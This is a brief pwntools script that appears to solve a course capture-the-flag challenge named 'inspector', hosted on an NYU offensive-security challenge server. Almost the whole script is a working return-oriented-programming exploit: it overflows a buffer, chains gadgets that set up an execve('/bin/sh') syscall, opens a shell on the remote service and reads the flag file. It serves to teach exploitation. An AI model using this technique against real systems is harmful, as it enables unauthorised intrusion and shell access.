'''
buffer is 32 chars long 
rsp is what's needed in syscall
rsi can store /bin/sh

'''

from pwn import *

garbage = 'a' * 0x28
rdi = p64(0x400708)
rsi = p64(0)
rdx = p64(0)
rax = p64(59)

syscall = p64(0x400625)
pop_rdi = p64(0x40062e)#
pop_rsi = p64(0x400636)#
pop_rdx = p64(0x40063e)
pop_rax = p64(0x400646)#

#p = process("./inspector")
p = connect("offsec-chalbroker.osiris.cyber.nyu.edu", 1342)
p.sendline("jm5833")
print p.recvuntil("shell")
p.sendline(garbage + (pop_rdi + rdi) + (pop_rdx + rdx) + (pop_rsi + rsi) + (pop_rax + rax) + syscall)
p.sendline("cat flag.txt")
print p.recvuntil("}")
